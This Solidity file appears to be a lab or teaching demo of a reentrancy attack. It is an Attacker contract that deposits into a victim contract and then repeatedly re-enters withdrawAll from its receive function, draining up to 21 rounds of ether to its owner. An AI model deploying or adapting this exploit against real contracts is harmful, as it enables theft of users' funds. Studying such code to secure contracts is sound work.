//SPDX-License-Identifier:MIT
pragma solidity ^0.8.19;
import "hardhat/console.sol";
interface IVictim {
    function balances(address) external returns(uint);
    function withdrawAll() external;
    function deposit() external payable;
}

contract Attacker {
    uint256 constant ONE_ETHER = 1 ether;
    uint256 constant FIVE_ETHER = 5 ether;
    uint256 public counter = 0;
    IVictim victim;
    address owner;
    
    
    constructor(address _victim) payable {
        victim = IVictim(_victim);
        owner = msg.sender;
    }

    function getContractBalance() external view returns(uint256) {
        return address(this).balance;
    }

    function attack(uint _amount) external {
        require(msg.sender == owner, "only Owner!");
        victim.deposit{value: _amount}();
        victim.withdrawAll();
    }

    receive() external payable {
        counter++;

        // The attacker only drains 21 ether.
        if(counter < 21) {               
            victim.withdrawAll();
        }

        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "something failed!");
    }
}